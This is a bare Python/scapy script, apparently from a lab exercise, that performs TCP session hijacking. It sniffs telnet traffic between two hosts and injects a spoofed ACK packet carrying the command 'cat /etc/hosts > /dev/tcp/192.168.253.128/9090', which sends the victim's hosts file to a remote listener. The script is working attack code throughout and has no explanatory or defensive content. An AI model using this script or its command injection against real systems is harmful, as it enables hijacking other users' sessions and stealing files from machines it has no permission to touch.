#!/usr/bin/env python3
from scapy.all import *
def spoof (pkt) :
    pre_ip = pkt[IP]
    pre_tcp = pkt[TCP]

    ip = IP(src=pre_ip.src, dst=pre_ip.dst)
    print(pre_ip.src)
    print(pre_tcp.sport)
    data = "\rcat /etc/hosts > /dev/tcp/192.168.253.128/9090\r"
    tcp = TCP(sport=pre_tcp.sport, dport=pre_tcp.dport, flags="A", seq=pre_tcp.seq+1,ack=pre_tcp.ack)
    pkt = ip/tcp/data
    pkt.show
    send (pkt , verbose=1,iface="br-4b43672156a8")
sniff(filter='tcp and src host 10.9.0.6 and dst host 10.9.0.7 and dst port 23', prn=spoof,iface="br-4b43672156a8")
